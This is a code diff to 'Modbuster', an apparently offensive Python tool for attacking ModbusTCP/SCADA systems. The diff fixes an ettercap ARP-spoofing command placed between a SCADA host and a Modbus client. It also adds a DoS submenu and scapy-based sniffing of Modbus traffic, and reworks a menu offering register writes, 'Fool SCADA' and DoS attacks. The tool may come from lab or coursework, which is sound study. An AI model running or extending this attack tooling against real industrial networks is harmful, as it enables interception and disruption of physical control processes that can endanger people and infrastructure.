@@ -4,12 +4,9 @@ import time
 import sys
 import importlib
 import nm_config
+import shutil
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-
-import shutil
-import importlib
-import os
 
 def setconfig():
     print("\n=== Load Configuration File ===")
@@ -33,10 +30,7 @@ def setconfig():
         
         try:
             if os.path.exists(source):
-                # You must actually copy the file before reloading
                 shutil.copy2(source, destination)
-                
-                # Reload the module so the rest of the script sees the new variables
                 importlib.reload(nm_config)
                 print(f"\n[+] Successfully loaded {profiles[select]} configuration")
             else:
@@ -54,7 +48,6 @@ def setconfig():
         print("Invalid selection")
         time.sleep(1)
         setconfig()
-                
 
 def clear():
     subprocess.run(["clear"], check=True)
@@ -65,7 +58,7 @@ def etterspoof():
         print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
         intrfce = input("Enter Interface Name: ") 
 
-        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"/{nm_config.scada_mac}/{nm_config.scada_ip}//", f"/{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
+        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, start_new_session=True)
         time.sleep(5)
@@ -95,12 +88,49 @@ def dos():
         else:
             firewall()
 
-    print("Selected option: DoS Attack\n")
-    print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
-    select = input(">> ")
-    if select == "2":
-        firewall()
-    else:
+    try:
+        print("Selected option: DoS Attack\n")
+        print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
+        select = input(">> ")
+        if select == "1":
+            print("\nNot yet implemented...sorry")
+            time.sleep(1)
+            dos()
+        elif select == "2":
+            firewall()
+        elif select == "q":
+            main()
+        else:
+            main()
+    except KeyboardInterrupt:
+        main()
+
+def traffic():
+    def capture(packet):
+        clear()
+        print("Modbus Packet captured")
+        hexdump(packet)
+        if packet.haslayer(Raw):
+            print("\nPacket Raw Load\n")
+            print(str(packet[Raw].load) + "\n")
+        print("\n-------------------------------------------------------------\n")
+        print("Press CTRL + C to Exit")
+
+    try:
+        sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip+"", prn=capture, store=0)
+        main()
+    except KeyboardInterrupt:
+        print("Exiting...")
+        time.sleep(0.5)
+        main()
+
+def test():
+    try:
+        sniff(store=0, prn=lambda x: x.summary())
+        main()
+    except KeyboardInterrupt:
+        print("Exiting...")
+        time.sleep(0.5)
         main()
 
 def msfconsole():
@@ -156,59 +186,58 @@ def fool():
         main()
 
 def main():
-	clear()
-	print(""" 
+    clear()
+    print(""" 
 ---------------------------------------------
        __   __   __        __  ___  ___  __  
  |\/| /  \ |  \ |__) |  | /__`  |  |__  |__) 
  |  | \__/ |__/ |__) \__/ .__/  |  |___ |  \ 
                                              
 ---------------------------------------------
-	
+    
 NCREPT ModbusTCP Python 3.9 Script
 by Gideon
-	
-	\n""")
-	
-	time.sleep(0.5)
-	
-	print("Select a function from the options below\n")
-	print("1) Write to Coils/Holding Registers")
-	print("2) Fool SCADA ")
-	print("3) DoS Attack")
-	print("4) View ModbusTCP Traffic")
-	print("5) Test Traffic Function (View All Traffic)")
-	print("6) Enable ARP Spoofing")
-	print("7) Set Configuration File ")
-	print("q) Exit Modbuster")
-	
-	try:
-	
-		select = input(">> ")
-		
-		if(select == "1"):
-			msfconsole()
-		elif(select == "2"):
-			fool()
-		elif(select == "3"):
-			dos()
-		elif(select == "4"):
-			traffic()
-		elif(select == "5"):
-			test()
-		elif(select == "6"):
-			etterspoof()
-		elif(select == "7"):
-			setconfig()
-		elif(select == "q"):
-			sys.exit(1)
-		else:
-			print("Invalid option\n")
-			time.sleep(1.5)
-			main()
-	except KeyboardInterrupt:
-		print("\nExiting...")
-		sys.exit(1)
+modified by Jesse Cutshall
+    
+    \n""")
+    
+    time.sleep(0.5)
+    
+    print("Select a function from the options below\n")
+    print("1) Write to Coils/Holding Registers")
+    print("2) Fool SCADA ")
+    print("3) DoS Attack")
+    print("4) View ModbusTCP Traffic")
+    print("5) Test Traffic Function (View All Traffic)")
+    print("6) Enable ARP Spoofing")
+    print("7) Set Configuration File ")
+    print("q) Exit Modbuster")
+    
+    try:
+        select = input(">> ")
+        if select == "1":
+            msfconsole()
+        elif select == "2":
+            fool()
+        elif select == "3":
+            dos()
+        elif select == "4":
+            traffic()
+        elif select == "5":
+            test()
+        elif select == "6":
+            etterspoof()
+        elif select == "7":
+            setconfig()
+        elif select == "q":
+            sys.exit(1)
+        else:
+            print("Invalid option\n")
+            time.sleep(1.5)
+            main()
+    except KeyboardInterrupt:
+        print("\nExiting...")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
